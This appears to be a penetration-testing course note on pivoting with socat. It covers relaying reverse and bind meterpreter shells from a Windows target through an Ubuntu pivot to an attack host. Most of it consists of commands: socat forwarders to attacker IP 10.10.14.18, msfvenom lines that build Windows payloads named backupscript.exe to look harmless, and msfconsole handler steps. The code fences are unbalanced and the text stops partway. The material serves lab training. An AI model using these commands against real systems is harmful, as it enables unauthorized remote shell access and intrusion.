### Socat Redirection with a Reverse Shell

[Socat](https://linux.die.net/man/1/socat)

```
# Socat is a bidirectional relay tool that can create pipe sockets between 2 independent network channels 
# without needing to use SSH tunneling. 
# It acts as a redirector that can listen on one host and port and forward that data to another IP address and port.

# We can start Metasploit's listener using the same command mentioned in the last section on our attack host, 
# and we can start socat on the Ubuntu server.
```

```
socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80     # Starting Socat Listener (Web/pivot host)
```

```
# Socat will listen on localhost on port 8080 and forward all the traffic to port 80 on our attack host (10.10.14.18). 
# Once our redirector is configured, we can create a payload that will connect back to our redirector, 
# which is running on our Ubuntu server. 

# We will also start a listener on our attack host because as soon as socat receives a connection from a target, 
# it will redirect all the traffic to our attack host's listener, where we would be getting a shell.
```

```
# Creating the Windows Payload (PenTest host)

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

# Keep in mind that we must transfer this payload to the Windows host. 
# We can use some of the same techniques used in previous sections to do so.


sudo msfconsole                                                            # Starting MSF Console (PenTest host)

### Socat Redirection with a Bind Shell

```
# Similar to our socat's reverse shell redirector, we can also create a socat bind shell redirector. 
# This is different from reverse shells that connect back from the Windows server to the Ubuntu server 
# and get redirected to our attack host. 

# In the case of bind shells, the Windows server will start a listener and bind to a particular port. 
# We can create a bind shell payload for Windows and execute it on the Windows host. 

# At the same time, we can create a socat redirector on the Ubuntu server, 
# which will listen for incoming connections from a Metasploit bind handler 
# and forward that to a bind shell payload on a Windows target. 
# The below figure should explain the pivot in a much better way.
```

![Socat1](./socat1.webp "Socat bind shell")


```
# We can create a bind shell using msfvenom with the below command.

msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443

# We can start a socat bind shell listener, which listens on port 8080 and forwards packets to Windows server 8443. (Web host)

socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443

# Finally, we can start a Metasploit bind handler. 
# This bind handler can be configured to connect to our socat's listener on port 8080 (Ubuntu server)
